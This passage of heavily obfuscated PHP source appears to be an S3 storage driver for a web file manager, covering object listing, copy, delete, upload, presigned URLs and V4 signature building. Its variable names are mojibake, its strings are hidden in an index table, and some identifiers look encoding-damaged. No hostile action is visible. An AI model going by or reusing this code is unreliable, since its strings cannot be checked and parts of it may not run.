$…ÖßºÙÌ[214])); if (!$®³Á§Õ­ && !GLOBAL_DEBUG) { return; } $ÙÙáı·Â = $…È³Êİ; static $ËØòØªß = null; if (!$ËØòØªß) { $ËØòØªß = strtoupper($this->getType()); } $…È³Êİ = $ËØòØªß . $…ÖßºÙÌ[215] . $…È³Êİ; if ($ºŸâ²”ä) { $ş‘®îè = error_get_last(); if ($ş‘®îè) { $…È³Êİ = array($…È³Êİ, $ş‘®îè); } } write_log($…È³Êİ, $…ÖßºÙÌ[216]); if ($®³Á§Õ­) { throw new Exception($ÙÙáı·Â); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($çğÙµ´¡) { set_timeout(); require_once SDK_DIR . $_SERVER[¯‘·½][217]; parent::__construct(); $this->_init($çğÙµ´¡); } public function _init($¶ìÏÆ²´) { $Ş°áÏ¼… =& $_SERVER[¯‘·½]; $this->config = $¶ìÏÆ²´; foreach ($¶ìÏÆ²´ as $¸—Ù¤™ => $Ëø¼¹Ú) { if (isset($this->{$¸—Ù¤™})) { $this->{$¸—Ù¤™} = $Ëø¼¹Ú; } } $this->endpoint = $¶ìÏÆ²´[$Ş°áÏ¼…[218]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $Ã…’ÉÏß = $this->getHost(); if (!get_url_scheme($this->endpoint) && substr($Ã…’ÉÏß, 0, 7) == $Ş°áÏ¼…[219]) { $Ã…’ÉÏß = $Ş°áÏ¼…[220] . substr($Ã…’ÉÏß, 7); } $this->client->setEndpoint($Ã…’ÉÏß); if (in_array(ACTION, array($Ş°áÏ¼…[213], $Ş°áÏ¼…[214]))) { $this->client->setExceptions(); } } public function setSignVersion($èƒ·›¸ = "\166\64") { $this->signVer = $èƒ·›¸; $this->client->setSignVersion($èƒ·›¸); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $˜—Ô›Ö) { return null; } } public function isBucketCors() { $Œ—ó ıº =& $_SERVER[¯‘·½]; $ùä¯¶Âî = $this->getBucketCors(); if (!$ùä¯¶Âî || !is_array($ùä¯¶Âî)) { return !1; } if (!is_array($ùä¯¶Âî[$Œ—ó ıº[221]])) { $ùä¯¶Âî[$Œ—ó ıº[221]] = explode($Œ—ó ıº[50], $ùä¯¶Âî[$Œ—ó ıº[221]]); } if ($ùä¯¶Âî[$Œ—ó ıº[222]] != $Œ—ó ıº[223] || !in_array($Œ—ó ıº[223], $ùä¯¶Âî[$Œ—ó ıº[221]])) { return !1; } $šÈà˜°² = array_map($Œ—ó ıº[224], $ùä¯¶Âî[$Œ—ó ıº[225]]); if (!is_array($šÈà˜°²)) { $šÈà˜°² = array(); } $î¢«İ¥— = array($Œ—ó ıº[226], $Œ—ó ıº[227], $Œ—ó ıº[228], $Œ—ó ıº[229], $Œ—ó ıº[230]); $È…ÌŒåÄ = array_diff($î¢«İ¥—, $šÈà˜°²); return empty($È…ÌŒåÄ); } public function getBktRegion() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($Á§íïª, $ôå³ıó = '', $³‘ïŞ£õ = REPEAT_RENAME) { $‰œÄ¤›à = $this->setContent($Á§íïª, $ôå³ıó); if ($‰œÄ¤›à !== !1) { return $this->getPathOuter($Á§íïª); } return !1; } public function mkdir($ÌÆüàæ, $¦‘ëÄÚ = REPEAT_SKIP) { $‚®æù =& $_SERVER[¯‘·½]; if (empty($ÌÆüàæ) && $ÌÆüàæ !== $‚®æù[231]) { return !1; } if ($¦‘ëÄÚ && $this->_isFolder($ÌÆüàæ)) { return $this->getPathOuter($ÌÆüàæ); } $ŸŸÙ²©¾ = $this->setContent($ÌÆüàæ, $‚®æù[12], !0); if ($ŸŸÙ²©¾ !== !1) { return $this->getPathOuter($ÌÆüàæ); } return !1; } public function copyFile($¸©äèÁ, $×½ÚÚí, $¶ò‘ø = array()) { $œ…´ËÌ— =& $_SERVER[¯‘·½]; $Ûö—Š›¾ = $this->objectMeta($¸©äèÁ); if (!$Ûö—Š›¾) { return !1; } if ($Ûö—Š›¾[$œ…´ËÌ—[79]] <= 1024 * 1024 * 200) { $™£€Ç¼¸ = $this->client->copyObject($this->bucket, $¸©äèÁ, $this->bucket, $×½ÚÚí, $œ…´ËÌ—[232], $¶ò‘ø); } else { $™£€Ç¼¸ = $this->client->multiCopyObject($this->bucket, $¸©äèÁ, $this->bucket, $×½ÚÚí, $¶ò‘ø); } $™£€Ç¼¸ = $™£€Ç¼¸ ? $this->getPathOuter($×½ÚÚí) : !1; return $™£€Ç¼¸; } public function moveFile($ÀÚµü±ª, $üà­“ï€) { if ($this->copyFile($ÀÚµü±ª, $üà­“ï€)) { $this->delFile($ÀÚµü±ª); return $this->getPathOuter($üà­“ï€); } return !1; } public function delFile($ç°ÔÅÜÅ) { return $this->client->deleteObject($this->bucket, $ç°ÔÅÜÅ); } public function delFolder($¼ˆŒğÈˆ) { $•µîï§ =& $_SERVER[¯‘·½]; if (!$this->exist($¼ˆŒğÈˆ)) { return !0; } $this->listItemCache = !1; $óÉ‚ä¤³ = $this->fileList($¼ˆŒğÈˆ); $this->listItemCache = !0; $Â‚ÀœáË = trim($¼ˆŒğÈˆ, $•µîï§[8]) . $•µîï§[8]; if (!empty($¼ˆŒğÈˆ) && $¼ˆŒğÈˆ !== $•µîï§[231] && !in_array($Â‚ÀœáË, $óÉ‚ä¤³[$•µîï§[85]])) { $óÉ‚ä¤³[$•µîï§[85]][] = $Â‚ÀœáË; } $Î…Ñ¸é” = $this->delByBatch($óÉ‚ä¤³[$•µîï§[86]]); if (!$Î…Ñ¸é”) { return !1; } $Î…Ñ¸é” = $this->delByBatch($óÉ‚ä¤³[$•µîï§[85]]); if (!$Î…Ñ¸é”) { return !1; } return $this->delFile($Â‚ÀœáË); } private function delByBatch($•Ü¼šúŠ) { foreach (array_chunk($•Ü¼šúŠ, 1000) as $ ğÍßé—) { $Šßó”¾Ú = $this->client->deleteObjects($this->bucket, $ ğÍßé—); if (!$Šßó”¾Ú) { return !1; } } return !0; } public function rename($†ÓÈ°õ½, $İ¸ì §é) { return $this->renameObject($†ÓÈ°õ½, $İ¸ì §é); } public function listPath($¹í¡Ùô±, $ã¹¢˜£† = false) { $±¡Í“Ç³ =& $_SERVER[¯‘·½]; $È¯Ãé“É = $this->fileList($¹í¡Ùô±, $±¡Í“Ç³[8], !0); foreach ($È¯Ãé“É[$±¡Í“Ç³[85]] as $ı¿©ò¾ => $™Ñ™ûá¸) { $È¯Ãé“É[$±¡Í“Ç³[85]][$ı¿©ò¾] = $this->folderInfo($™Ñ™ûá¸, $ã¹¢˜£†, $™Ñ™ûá¸); } foreach ($È¯Ãé“É[$±¡Í“Ç³[86]] as $ı¿©ò¾ => $™Ñ™ûá¸) { $È¯Ãé“É[$±¡Í“Ç³[86]][$ı¿©ò¾] = $this->fileInfo($™Ñ™ûá¸[$±¡Í“Ç³[32]], $ã¹¢˜£†, $™Ñ™ûá¸); } return $È¯Ãé“É; } protected function infoChildren($Ÿ‡äöõ·, &$—ï¹÷×ó) { $’Úİùˆ =& $_SERVER[¯‘·½]; $ÁåÃë´Ş = $this->fileList($Ÿ‡äöõ·, $’Úİùˆ[12], !0); $—ï¹÷×ó[$’Úİùˆ[81]] += count($ÁåÃë´Ş[$’Úİùˆ[85]]); $—ï¹÷×ó[$’Úİùˆ[80]] += count($ÁåÃë´Ş[$’Úİùˆ[86]]); foreach ($ÁåÃë´Ş[$’Úİùˆ[86]] as $ëÔÛô«â) { if (!$ëÔÛô«â || !$ëÔÛô«â[$’Úİùˆ[79]]) { continue; } $—ï¹÷×ó[$’Úİùˆ[79]] += $ëÔÛô«â[$’Úİùˆ[79]]; } } private function fileInfo($®¡ƒ´Ÿ¸, $ÒÎë”á¥ = false, $üñÅ˜Á = array()) { $ÎôÑ‡“ =& $_SERVER[¯‘·½]; $½ÒÓ»ÆÆ = array($ÎôÑ‡“[32] => $this->pathThis($®¡ƒ´Ÿ¸), $ÎôÑ‡“[87] => $this->getPathOuter($®¡ƒ´Ÿ¸), $ÎôÑ‡“[33] => $ÎôÑ‡“[233], $ÎôÑ‡“[169] => $this->ext($®¡ƒ´Ÿ¸), $ÎôÑ‡“[79] => isset($üñÅ˜Á[$ÎôÑ‡“[79]]) ? $üñÅ˜Á[$ÎôÑ‡“[79]] : 0); if ($ÒÎë”á¥) { return $½ÒÓ»ÆÆ; } $½ÒÓ»ÆÆ[$ÎôÑ‡“[234]] = $½ÒÓ»ÆÆ[$ÎôÑ‡“[88]] = 0; $½ÒÓ»ÆÆ[$ÎôÑ‡“[235]] = $½ÒÓ»ÆÆ[$ÎôÑ‡“[236]] = !0; if (empty($üñÅ˜Á)) { $üñÅ˜Á = $this->objectMeta($®¡ƒ´Ÿ¸); if (!$üñÅ˜Á) { return $½ÒÓ»ÆÆ; } } if (isset($üñÅ˜Á[$ÎôÑ‡“[237]]) && $üñÅ˜Á[$ÎôÑ‡“[237]]) { $½ÒÓ»ÆÆ[$ÎôÑ‡“[238]] = $üñÅ˜Á[$ÎôÑ‡“[237]]; } if (isset($üñÅ˜Á[$ÎôÑ‡“[207]])) { $½ÒÓ»ÆÆ[$ÎôÑ‡“[88]] = $üñÅ˜Á[$ÎôÑ‡“[207]]; } if (isset($üñÅ˜Á[$ÎôÑ‡“[79]])) { $½ÒÓ»ÆÆ[$ÎôÑ‡“[79]] = $üñÅ˜Á[$ÎôÑ‡“[79]]; } return $½ÒÓ»ÆÆ; } private function folderInfo($Ó÷êûü, $­³êø‚í = false, $ÚÏêí´Ú = array()) { $±£Ï¬¯ø =& $_SERVER[¯‘·½]; $ˆ­¾Š°É = array($±£Ï¬¯ø[32] => $this->pathThis($Ó÷êûü), $±£Ï¬¯ø[87] => $this->getPathOuter($±£Ï¬¯ø[8] . $Ó÷êûü), $±£Ï¬¯ø[33] => $±£Ï¬¯ø[78]); if ($­³êø‚í) { return $ˆ­¾Š°É; } $ˆ­¾Š°É[$±£Ï¬¯ø[234]] = $ˆ­¾Š°É[$±£Ï¬¯ø[88]] = 0; $ˆ­¾Š°É[$±£Ï¬¯ø[235]] = $ˆ­¾Š°É[$±£Ï¬¯ø[236]] = !0; if ($Ó÷êûü == $±£Ï¬¯ø[12]) { return $ˆ­¾Š°É; } if (empty($ÚÏêí´Ú)) { $ÚÏêí´Ú = $this->objectMeta(trim($Ó÷êûü, $±£Ï¬¯ø[8]) . $±£Ï¬¯ø[8]); } if (isset($ÚÏêí´Ú[$±£Ï¬¯ø[207]])) { $ˆ­¾Š°É[$±£Ï¬¯ø[234]] = $ÚÏêí´Ú[$±£Ï¬¯ø[207]]; } return $ˆ­¾Š°É; } private function fileList($è¤‹ÖÏ, $¥‚İÄ‹á = '', $˜ÈŠÙ§Ó = 0) { $Æ®Ğ¾â =& $_SERVER[¯‘·½]; $Á‰ıï†­ = rtrim($è¤‹ÖÏ, $Æ®Ğ¾â[8]) . $Æ®Ğ¾â[8]; $¶Æóî– = $this->listObjs($Á‰ıï†­, null, null, $¥‚İÄ‹á); if (!$¶Æóî–) { return array($Æ®Ğ¾â[85] => array(), $Æ®Ğ¾â[86] => array()); } $áà¼²…Õ = $´ÊÂôÉÜ = array(); foreach ($¶Æóî–[$Æ®Ğ¾â[239]] as $á»°ì×§) { $ãÉ÷œ·Ø = $á»°ì×§[$Æ®Ğ¾â[32]]; if ($ãÉ÷œ·Ø == $Á‰ıï†­) { continue; } $ÃÍ±˜ù› = isset($á»°ì×§[$Æ®Ğ¾â[79]]) ? $á»°ì×§[$Æ®Ğ¾â[79]] : 0; $ÌÉ¿Û…³ = $ÃÍ±˜ù› == 0 && substr($ãÉ÷œ·Ø, strlen($ãÉ÷œ·Ø) - 1, 1) == $Æ®Ğ¾â[8] ? !0 : !1; $this->cacheMethodInfoSet($ãÉ÷œ·Ø, $ÌÉ¿Û…³, $á»°ì×§); if ($ÌÉ¿Û…³) { $áà¼²…Õ[] = $ãÉ÷œ·Ø; continue; } $´ÊÂôÉÜ[] = $˜ÈŠÙ§Ó ? $á»°ì×§ : $ãÉ÷œ·Ø; } foreach ($¶Æóî–[$Æ®Ğ¾â[240]] as $á»°ì×§) { $áà¼²…Õ[] = $á»°ì×§[$Æ®Ğ¾â[32]]; $this->cacheMethodInfoSet($á»°ì×§[$Æ®Ğ¾â[32]], !0); } $this->cacheMethodInfoSet($è¤‹ÖÏ, !0); return array($Æ®Ğ¾â[85] => $áà¼²…Õ, $Æ®Ğ¾â[86] => $´ÊÂôÉÜ); } private function listObjs($ªİóÇËÓ, $±æÍ‘øê = null, $äõ•®åÍ = null, $ıÎ“ç± = null) { $Ö¿“Â¡¹ =& $_SERVER[¯‘·½]; $ªİóÇËÓ = trim($ªİóÇËÓ, $Ö¿“Â¡¹[8]); $µ…¸ñ¶» = empty($ªİóÇËÓ) && $ªİóÇËÓ !== $Ö¿“Â¡¹[231] ? $Ö¿“Â¡¹[12] : $ªİóÇËÓ . $Ö¿“Â¡¹[8]; return $this->client->getBucket($this->bucket, $µ…¸ñ¶», $±æÍ‘øê, $äõ•®åÍ, $ıÎ“ç±, !0); } public function has($ıæ×¶ÛÀ, $ºš×îÁ = false, $‚ÀŸ¸ü· = true) { $š»ù«œ½ =& $_SERVER[¯‘·½]; $ıæ×¶ÛÀ = trim($ıæ×¶ÛÀ, $š»ù«œ½[8]); $ƒÃ’ùË = empty($ıæ×¶ÛÀ) && $ıæ×¶ÛÀ !== $š»ù«œ½[231] ? $š»ù«œ½[12] : $ıæ×¶ÛÀ . $š»ù«œ½[8]; $èùµ¨Ö = null; $íğŠ‚…‚ = 500; $Ø¬³Äï‡ = $š»ù«œ½[8]; $”ÚÈò°Å = $‹„¥ = array(); while (!0) { $„—ä†‡ = $this->listObjs($ıæ×¶ÛÀ, $èùµ¨Ö, $íğŠ‚…‚, $Ø¬³Äï‡); if (!$„—ä†‡) { break; } $èùµ¨Ö = $„—ä†‡[$š»ù«œ½[241]]; $«µÄ£µÕ = $„—ä†‡[$š»ù«œ½[239]]; $™ÌÍÌ§Ö = $„—ä†‡[$š»ù«œ½[240]]; if (empty($«µÄ£µÕ) && empty($™ÌÍÌ§Ö)) { break; } if (count($«µÄ£µÕ) == 1 && $«µÄ£µÕ[0][$š»ù«œ½[32]] == $ƒÃ’ùË) { break; } if ($ºš×îÁ) { if (count($«µÄ£µÕ)) { $«µÄ£µÕ = array_column($«µÄ£µÕ, $š»ù«œ½[32]); $”ÚÈò°Å = array_merge($”ÚÈò°Å, $«µÄ£µÕ); } if (count($™ÌÍÌ§Ö)) { $™ÌÍÌ§Ö = array_column($™ÌÍÌ§Ö, $š»ù«œ½[32]); $‹„¥ = array_merge($‹„¥, $™ÌÍÌ§Ö); } if ($èùµ¨Ö === null) { break; } continue; } if ($‚ÀŸ¸ü·) { if (!empty($«µÄ£µÕ)) { if (count($«µÄ£µÕ) > 1 || isset($«µÄ£µÕ[0][$š»ù«œ½[32]]) && $«µÄ£µÕ[0][$š»ù«œ½[32]] != $ƒÃ’ùË) { return !0; } } } else { if (!empty($™ÌÍÌ§Ö)) { return !0; } } if ($èùµ¨Ö === null) { break; } } if ($ºš×îÁ) { $”ÚÈò°Å = array_diff($”ÚÈò°Å, array($ƒÃ’ùË)); $”ÚÈò°Å = count(array_unique($”ÚÈò°Å)); $‹„¥ = count(array_unique($‹„¥)); return array($š»ù«œ½[242] => $”ÚÈò°Å, $š»ù«œ½[243] => $‹„¥); } return !1; } public function listAll($…¾êİ—’) { $€„Ÿ×éÙ =& $_SERVER[¯‘·½]; $Îò‡ßµÙ = $this->fileList($…¾êİ—’, $€„Ÿ×éÙ[12], !0); $õş’êäÑ = array_to_keyvalue($Îò‡ßµÙ[$€„Ÿ×éÙ[86]], $€„Ÿ×éÙ[32]); foreach ($Îò‡ßµÙ[$€„Ÿ×éÙ[85]] as $Êâ‚ú¤ı) { if (is_string($Êâ‚ú¤ı)) { $õş’êäÑ[$Êâ‚ú¤ı] = array($€„Ÿ×éÙ[79] => 0); } } return $this->listAllFiles($…¾êİ—’, $õş’êäÑ); } public function canRead($äˆ»±Ù) { $ÅÃõØ¥¢ =& $_SERVER[¯‘·½]; $¼¹œŒæÉ = $this->client->getAccessControlPolicy($this->bucket, $äˆ»±Ù); if (!$¼¹œŒæÉ) { return !1; } return in_array($¼¹œŒæÉ, array($ÅÃõØ¥¢[244], $ÅÃõØ¥¢[245], $ÅÃõØ¥¢[246])) ? !0 : !1; } public function canWrite($¬§É¢Ê) { $Åƒ‚½¼Î =& $_SERVER[¯‘·½]; $µâ…ùÛí = $this->client->getAccessControlPolicy($this->bucket, $¬§É¢Ê); if (!$µâ…ùÛí) { return !1; } return in_array($µâ…ùÛí, array($Åƒ‚½¼Î[244], $Åƒ‚½¼Î[245])) ? !0 : !1; } public function getContent($ú›è“ì„) { return $this->client->getObject($this->bucket, $ú›è“ì„); } public function setContent($“±×‘•œ, $Î–Ö¤Ş“ = '', $ĞÇÃÛˆï = false) { $®ñ…ì¼ =& $_SERVER[¯‘·½]; $“±×‘•œ = $ĞÇÃÛˆï ? trim($“±×‘•œ, $®ñ…ì¼[8]) . $®ñ…ì¼[8] : $“±×‘•œ; $ŸÊ£Òéš = get_file_mime(get_path_ext($“±×‘•œ)); $ƒ‘²Û = $this->client->putObject($Î–Ö¤Ş“, $this->bucket, $“±×‘•œ, $®ñ…ì¼[232], array(), $ŸÊ£Òéš); if (!$ƒ‘²Û) { return !1; } if ($ĞÇÃÛˆï) { return !0; } return $ƒ‘²Û ? !0 : !1; } public function fileSubstr($ñÁ¡’Æü, $ºšõÇŠ‡, $’„Â¼ã¹) { $àêğ‚©ù = $ºšõÇŠ‡ + $’„Â¼ã¹ - 1; return $this->client->getObject($this->bucket, $ñÁ¡’Æü, array($_SERVER[¯‘·½][247] => "\142\x79\164\x65\x73\x3d{$ºšõÇŠ‡}\x2d{$àêğ‚©ù}")); } public function upload($¬¶øõ…ñ, $º‚¹É´è, $ŸÃô¶º³ = false, $Ø»¥ñĞ = REPEAT_REPLACE) { $’×˜ù”ü =& $_SERVER[¯‘·½]; $¤íâİ± = array($’×˜ù”ü[248] => @md5_file($º‚¹É´è)); $°‘å‹Àª = array($’×˜ù”ü[249] => get_file_mime(get_path_ext($¬¶øõ…ñ))); if (IO::size($º‚¹É´è) <= 1024 * 1024 * 200) { $­ğñ‘Æ = $this->client->putObjectFile($º‚¹É´è, $this->bucket, $¬¶øõ…ñ, $’×˜ù”ü[232], $¤íâİ±, $°‘å‹Àª); return !empty($­ğñ‘Æ) ? $this->getPathOuter($¬¶øõ…ñ) : !1; } $Š›Ê©é” = $this->client->multiUploadObject($º‚¹É´è, $this->bucket, trim($¬¶øõ…ñ, $’×˜ù”ü[8]), $¤íâİ±, $°‘å‹Àª); return $Š›Ê©é” ? $this->getPathOuter($¬¶øõ…ñ) : !1; } public function download($•«–»ÛØ, $Û›Ììƒ) { if (!@is_dir($this->pathFather($Û›Ììƒ)) && !IO::mkdir($this->pathFather($Û›Ììƒ))) { return !1; } $ÂíİÔ² = $this->client->getObject($this->bucket, $•«–»ÛØ, array(), $Û›Ììƒ); return $ÂíİÔ² !== !1 ? $Û›Ììƒ : !1; } public function link($Ÿ²Ğ…Æ , $ı›½“Ø = array()) { return $this->getPreSignedURL($Ÿ²Ğ…Æ , 3600 * 12, $ı›½“Ø); } private function getPreSignedURL($Å‘ÚÔ¡Û, $ñ„êœåœ, $¡Ñ™øñ = array(), $®˜ÀĞ‡É = "\x47\105\x54") { $ïöÙ×°¹ =& $_SERVER[¯‘·½]; $Å‘ÚÔ¡Û = trim($Å‘ÚÔ¡Û, $ïöÙ×°¹[8]); if ($this->signVer == $ïöÙ×°¹[250]) { return $this->client->getPreSignedV2URL($this->bucket, $Å‘ÚÔ¡Û, $ñ„êœåœ, $®˜ÀĞ‡É, $¡Ñ™øñ); } return $this->client->getPreSignedV4URL($this->bucket, $Å‘ÚÔ¡Û, $ñ„êœåœ, array(), $®˜ÀĞ‡É, $¡Ñ™øñ); } public function fileOut($”¬©Š²¢, $àŠãÑÒ‰ = false, $³Ä´‹Ú = false, $ğ¦ú¥±³ = '') { $ì÷Õ½ŒÄ =& $_SERVER[¯‘·½]; if ($this->isFileOutServer()) { return $this->fileOutServer($”¬©Š²¢, $àŠãÑÒ‰, $³Ä´‹Ú, $ğ¦ú¥±³); } if (!$³Ä´‹Ú) { $³Ä´‹Ú = $this->pathThis($”¬©Š²¢); } $çèÕ“Ø« = get_file_mime(get_path_ext($³Ä´‹Ú)); if ($çèÕ“Ø« == $ì÷Õ½ŒÄ[251]) { return parent::fileOut($”¬©Š²¢, $àŠãÑÒ‰, $³Ä´‹Ú, $ğ¦ú¥±³); } $Äéœ¼­é = array($ì÷Õ½ŒÄ[252] => $çèÕ“Ø«); if ($àŠãÑÒ‰) { $Äéœ¼­é[$ì÷Õ½ŒÄ[253]] = $ì÷Õ½ŒÄ[254] . rawurlencode($³Ä´‹Ú); } else { } $·Ş¯–à = $this->link($”¬©Š²¢, $Äéœ¼­é); $this->fileOutLink($·Ş¯–à); } public function fileOutServer($óŒÑÌ¸Ë, $şÏ¢ş = false, $ïÃ›ÅŸ© = false, $âåó€ˆ = '') { parent::fileOut($óŒÑÌ¸Ë, $şÏ¢ş, $ïÃ›ÅŸ©, $âåó€ˆ); } public function fileOutImageServer($×íÆŞë¥, $Ù¼Ùæ = 250) { parent::fileOutImage($×íÆŞë¥, $Ù¼Ùæ); } public function fileOutLink($»ªÇÕÔ) { $ç¤Ø° =& $_SERVER[¯‘·½]; if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($ç¤Ø°[67], $ç¤Ø°[66], $ç¤Ø°[68])) && !get_url_scheme($this->endpoint) && substr($»ªÇÕÔ, 0, 7) == $ç¤Ø°[219]) { $»ªÇÕÔ = $ç¤Ø°[220] . substr($»ªÇÕÔ, 7); } header($ç¤Ø°[175] . $»ªÇÕÔ); die; } public function hashMd5($û½¿¬üâ, $âÌ†¼†í = '') { $ÑÕ¨£Û¶ = $this->objectMeta($û½¿¬üâ); if (!$ÑÕ¨£Û¶) { return !1; } $âÌ†¼†í = $âÌ†¼†í ? $âÌ†¼†í : _get($ÑÕ¨£Û¶, $_SERVER[¯‘·½][255]); return $âÌ†¼†í; } public function uploadFormData($öˆÏ³, $¹ĞÀãğ = 3600) { $“Ô²ÁíÃ =& $_SERVER[¯‘·½]; if (!$this->_isClientAsync()) { $œöí¿˜¢ = $this->getPreSignedURL($öˆÏ³, $¹ĞÀãğ, array(), $“Ô²ÁíÃ[256]); return array($“Ô²ÁíÃ[209] => str_replace($“Ô²ÁíÃ[219], $“Ô²ÁíÃ[257], $œöí¿˜¢)); } if (isset($GLOBALS[$“Ô²ÁíÃ[6]][$“Ô²ÁíÃ[92]][$“Ô²ÁíÃ[258]]) && $GLOBALS[$“Ô²ÁíÃ[6]][$“Ô²ÁíÃ[92]][$“Ô²ÁíÃ[258]] == $“Ô²ÁíÃ[231]) { return $this->uploadMultiData($öˆÏ³, $¹ĞÀãğ); } if ($this->signVer == $“Ô²ÁíÃ[250]) { return $this->uploadFormDataV2($öˆÏ³, $¹ĞÀãğ); } return $this->uploadFormDataV4($öˆÏ³, $¹ĞÀãğ); } public function uploadFormDataV2($²™µ«Ú›, $şÕ”‚Áò = 3600) { $»ï€—˜• =& $_SERVER[¯‘·½]; $€Íë§Ò = $this->pathFather($²™µ«Ú›); $í‘¾ñ›» = $this->client->getHttpUploadPostParams($this->bucket, $€Íë§Ò, $»ï€—˜•[232], $şÕ”‚Áò); $†ïõÙŸ„ = array_merge((array) $í‘¾ñ›», array($»ï€—˜•[259] => $»ï€—˜•[250], $»ï€—˜•[209] => $this->getHost())); if ($this->_isClientAsync()) { unset($†ïõÙŸ„[$»ï€—˜•[259]]); } return $†ïõÙŸ„; } public function uploadFormDataV4($Ù°ãùùÀ, $˜‘æ¾àÒ = 3600) { $öõŞ±±ú =& $_SERVER[¯‘·½]; $ °œÁ™ = $öõŞ±±ú[232]; $Â™“Óòà = $öõŞ±±ú[260]; $ˆÓ™¸Ø = $öõŞ±±ú[62]; $üû¨ ÕĞ = gmdate($öõŞ±±ú[261]); $õµëå = gmdate($öõŞ±±ú[262]); $õïú‡øç = $öõŞ±±ú[263]; $ş•¨ŒÇû = $˜‘æ¾àÒ . $öõŞ±±ú[12]; $¢ö®¸Şœ = $öõŞ±±ú[264]; $»Ù³º™› = array($this->accessKey, $õµëå, $this->region, $ˆÓ™¸Ø, $õïú‡øç); $¹¬ şè = implode($öõŞ±±ú[8], $»Ù³º™›); $öë…Ğ‡î = array($öõŞ±±ú[265] => gmdate($öõŞ±±ú[266], strtotime($öõŞ±±ú[267])), $öõŞ±±ú[268] => array(array($öõŞ±±ú[269] => $this->bucket), array($öõŞ±±ú[270], $öõŞ±±ú[271], $öõŞ±±ú[12]), array($öõŞ±±ú[270], $öõŞ±±ú[272], $öõŞ±±ú[12]), array($öõŞ±±ú[273] => $¢ö®¸Şœ), array($öõŞ±±ú[274] => $¹¬ şè), array($öõŞ±±ú[275] => $Â™“Óòà), array($öõŞ±±ú[276] => $üû¨ ÕĞ), array($öõŞ±±ú[277] => $ş•¨ŒÇû))); $æè´ã¬ = base64_encode(json_encode($öë…Ğ‡î)); $‚ÇÇÚÓ¶ = hash_hmac($öõŞ±±ú[278], $õµëå, $öõŞ±±ú[279] . $this->secret, !0); $×ŸÓ¸… = hash_hmac($öõŞ±±ú[278], $this->region, $‚ÇÇÚÓ¶, !0); $¶×£ãüò = hash_hmac($öõŞ±±ú[278], $ˆÓ™¸Ø, $×ŸÓ¸…, !0); $¢Ú¢º­÷ = hash_hmac($öõŞ±±ú[278], $õïú‡øç, $¶×£ãüò, !0); $Ëô®ÌÔ« = hash_hmac($öõŞ±±ú[278], $æè´ã¬, $¢Ú¢º­÷); $í§‰Àúè = array($öõŞ±±ú[249] => $öõŞ±±ú[12], $öõŞ±±ú[273] => $¢ö®¸Şœ, $öõŞ±±ú[280] => $æè´ã¬, $öõŞ±±ú[274] => $¹¬ şè, $öõŞ±±ú[275] => $Â™“Óòà, $öõŞ±±ú[276] => $üû¨ ÕĞ, $öõŞ±±ú[277] => $ş•¨ŒÇû, $öõŞ±±ú[281] => $Ëô®ÌÔ«, $öõŞ±±ú[259] => $öõŞ±±ú[250], $öõŞ±±ú[209] => $this->getHost()); if ($this->_isClientAsync()) { unset($í§‰Àúè[$öõŞ±±ú[259]]); } return $í§‰Àúè; } public function uploadMultiData($„–¿, $ùèï€ø¤ = 3600) { $İÁªÊ× =& $_SERVER[¯‘·½]; $¯İÃúîº = $this->signVer == $İÁªÊ×[250] ? gmdate($İÁªÊ×[282]) : gmdate($İÁªÊ×[283]); $½¦ÄÑ‚† = array(); $âÂ†£¢ = $this->client->getUploadId($this->bucket, $„–¿, $½¦ÄÑ‚†); if (!$âÂ†£¢) { return !1; } $Øä‰Àùã = array($İÁªÊ×[284] => $âÂ†£¢, $İÁªÊ×[209] => $this->getHost() . $İÁªÊ×[8] . $this->pathEncode($„–¿), $İÁªÊ×[285] => $¯İÃúîº, $İÁªÊ×[97] => $„–¿, $İÁªÊ×[259] => $this->signVer); if ($this->_isClientAsync()) { unset($Øä‰Àùã[$İÁªÊ×[259]]); } return $Øä‰Àùã; } public function uploadMultiAuth($¥ğ…’ªñ, $Â–Ò¿Èá = array()) { $ÅşÓóä =& $_SERVER[¯‘·½]; if ($this->signVer == $ÅşÓóä[250]) { if (isset($Â–Ò¿Èá[$ÅşÓóä[286]])) { return $this->uploadPartAuthV2($¥ğ…’ªñ, $Â–Ò¿Èá); } return $this->uploadListAuthV2($¥ğ…’ªñ, $Â–Ò¿Èá); } if (isset($Â–Ò¿Èá[$ÅşÓóä[286]])) { return $this->uploadPartAuthV4($¥ğ…’ªñ, $Â–Ò¿Èá); } return $this->uploadListAuthV4($¥ğ…’ªñ, $Â–Ò¿Èá); } public function uploadPartAuthV2($¥²‚¢ã, $´şÙ¸§º = array()) { $øï¡„Ù© =& $_SERVER[¯‘·½]; $˜Î°ƒÒ¼ = $´şÙ¸§º[$øï¡„Ù©[97]]; $ûŞ€¾ö’ = gmdate($øï¡„Ù©[282]); $¹¯ı±÷ = array_intersect_key($´şÙ¸§º, array_flip(array($øï¡„Ù©[286], $øï¡„Ù©[284]))); ksort($¹¯ı±÷); $Âêã¾» = $¹¯ı±÷ ? $øï¡„Ù©[76] . http_build_query($¹¯ı±÷, null, $øï¡„Ù©[287], PHP_QUERY_RFC3986) : $øï¡„Ù©[12]; $½‰³ŸÆ = array($øï¡„Ù©[256], $øï¡„Ù©[12], $øï¡„Ù©[123], $øï¡„Ù©[12], "\170\55\x61\155\x7a\55\x64\x61\x74\x65\x3a{$ûŞ€¾ö’}", $øï¡„Ù©[8] . $this->bucket . $øï¡„Ù©[8] . $this->pathEncode($˜Î°ƒÒ¼) . $Âêã¾»); $ìÂ¢ÚÔ¹ = implode($øï¡„Ù©[288], $½‰³ŸÆ); $Š»Š¢æ = $this->client->__getSignature($ìÂ¢ÚÔ¹); return array($øï¡„Ù©[289] => $Š»Š¢æ, $øï¡„Ù©[285] => $ûŞ€¾ö’); } public function uploadListAuthV2($àğß˜¢, $Œ„Ö¸•Á = array()) { $¥âºõ© =& $_SERVER[¯‘·½]; $á¿Õ®ĞŒ = $Œ„Ö¸•Á[$¥âºõ©[97]]; $èŒĞî¡ = 